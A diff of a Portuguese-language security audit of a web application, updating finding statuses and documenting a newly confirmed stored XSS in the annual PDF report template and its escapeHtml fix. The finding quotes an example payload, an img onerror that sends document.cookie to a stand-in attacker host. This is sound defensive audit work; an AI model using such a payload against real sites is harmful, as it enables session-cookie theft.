@@ -2,7 +2,7 @@
 
 **Data:** 2026-08-04
 **Versão auditada:** v3.15.1 (`ec2a05a`)
-**Corrigidos:** A2 e A2b em v3.15.2 · A5 e A9 em v3.15.3 · A7 (SheetJS) em v3.15.4 · A3 em v3.15.5
+**Corrigidos:** A2 e A2b em v3.15.2 · A5 e A9 em v3.15.3 · A7 (SheetJS) em v3.15.4 · A3 em v3.15.5 · A8 (parcial, ver nota em v3.21.5) em v3.21.5
 **Alvo:** `src/index.src.html` (fonte), `index.html` (servido), `tools/build.mjs`,
 `.github/workflows/build.yml`, `workflow-default.json`, `email-template.json`,
 `manifest.webmanifest`, histórico Git.
@@ -49,7 +49,7 @@ o histórico do processo.
 | A5 | Dados pessoais e institucionais em repositório público | **Média** | Sim | ✅ v3.15.3 (parcial) |
 | A6 | Integridade dos dados não verificável (registos adulteráveis) | **Média** | Interno | aberto |
 | A7 | `xlsx` 0.18.5 e restantes bibliotecas CDN desactualizadas | **Baixa** | Improvável | ✅ v3.15.4 (SheetJS; restantes abertas) |
-| A8 | `eval()` na geração de PDF | **Baixa** | Não (hoje) | aberto |
+| A8 | `eval()` na geração de PDF | **Baixa** (o `eval` em si) / **Média** (achado novo, ver abaixo) | Sim, achado novo | parcial ✅ v3.21.5 |
 | A9 | GitHub Actions com `contents: write` e actions não fixadas por SHA | **Baixa** | Interno | ✅ v3.15.3 |
 | A10 | **Regressão:** correcções de segurança anteriores foram perdidas | **Processo** | — | parcial |
 
@@ -357,6 +357,21 @@ São **cinco** bibliotecas de terceiros a correr com plena confiança.
   cdnjs estiver inacessível, a aplicação não arranca de todo (o próprio
   `bootGuard` o admite, `:54`).
 
+**Tentativa em v3.21.5** — implementação adiada: o ambiente usado para essa
+sessão tem `cdnjs.cloudflare.com` bloqueado pela política de rede
+(`403` na ligação), o que impede obter os ficheiros e calcular os hashes
+`sha384` reais. Preferiu-se não avançar a inserir hashes adivinhados ou
+copiados de outra fonte — um `integrity` errado bloqueia o carregamento do
+browser tal como seria suposto bloquear um ficheiro adulterado. Fica a
+recomendação prática: correr, num ambiente com acesso à cdnjs,
+```
+curl -sS <url> | openssl dgst -sha384 -binary | openssl base64 -A
+```
+para as cinco URLs de `src/index.src.html:74-76` e `loadLib()`, e aplicar
+`integrity="sha384-…"` + `crossorigin="anonymous"` a cada uma. A alternativa de
+alojar localmente (como já feito para o `xlsx` em A7) evita este problema por
+completo.
+
 ---
 
 ### A5 — Dados pessoais e institucionais em repositório público · **Média**
@@ -552,6 +567,51 @@ na CSP** (A3), enfraquecendo-a para toda a aplicação.
 invocá-la por referência (`iframeWin.ULSM_fillMonthlyReport(data)`), em vez de a
 reconstruir a partir de texto. Remove o `eval` e permite uma CSP sem
 `'unsafe-eval'`.
+
+#### Achado novo, confirmado em v3.21.5 — XSS real em `ULSM_fillAnnualReport`
+
+Uma avaliação externa (`AVALIACAO_SEGURANCA_ULSM_20260901.md`) assinalava como
+"não confirmado" se as funções de preenchimento dos templates de PDF
+(`ULSM_fillMonthlyReport`/`ULSM_fillAnnualReport`, dentro de
+`window.__ULSM_TEMPLATE_MENSAL`/`_ANUAL`) escreviam campos variáveis via
+`innerHTML` sem escapar. A leitura do corpo das duas funções confirma que sim,
+num dos dois templates:
+
+- **`ULSM_fillMonthlyReport`** já define e usa `escapeHtml()` em todos os
+  campos de texto livre (`w.role`, `s.code`, `p.service`, `p.phaseCode`,
+  `p.phaseLabel`). Correcto.
+- **`ULSM_fillAnnualReport` não tinha `escapeHtml()` nenhum.** O nome do
+  serviço (`entry.service`, vindo de `proc.service` — campo de texto livre,
+  sujeito só a `toSafeText()`, que trunca mas **não escapa HTML**, ver F5/A-toSafeText
+  abaixo) era interpolado sem escape em `tbody.innerHTML`, num atributo e no
+  conteúdo da célula:
+  ```js
+  `<td class="service-name" title="${e.service || ''}">${e.service || '—'}</td>`
+  ```
+  Um `proc.service` como `"><img src=x onerror=fetch('https://atacante/'+btoa(document.cookie))>`
+  quebra o atributo `title` e injecta um `<img>` que executa no `iframe` da
+  exportação de PDF — precisamente o contexto onde a CSP já permite
+  `'unsafe-eval'` (ver A3). Ao contrário do A2, este vector não depende de
+  importar um ficheiro de workflow: basta um processo com esse nome de
+  serviço, criado pela interface normal de gestão de processos, para que
+  qualquer exportação do relatório anual execute o payload.
+
+  A causa aparenta ser uma correcção aplicada ao template mensal (que já tinha
+  `escapeHtml`) sem ser replicada no template anual, que é um ficheiro-irmão
+  quase idêntico.
+
+**Correcção aplicada** — `escapeHtml()` (mesma implementação do template
+mensal) acrescentado ao `ULSM_fillAnnualReport`, aplicado a `e.service` nas
+duas posições (atributo `title` e conteúdo da célula). Os restantes campos
+interpolados nesse `innerHTML` (`plannedStart`/`plannedEnd`, formatados
+internamente a partir de datas; `status`, restrito a um enum fixo
+`done|ok|warning|late|paused|planned|overdue` resolvido por `entryExecStatus()`)
+não são texto livre do utilizador — não precisam de escaping adicional.
+
+**Não corrigido nesta versão** — o `eval()` em si (a recomendação original
+desta secção, remover o `eval` e injectar por referência) continua aberto;
+o que foi fechado é o XSS concreto que o achado novo expôs, não a superfície
+do `eval` como um todo.
 
 ---
 
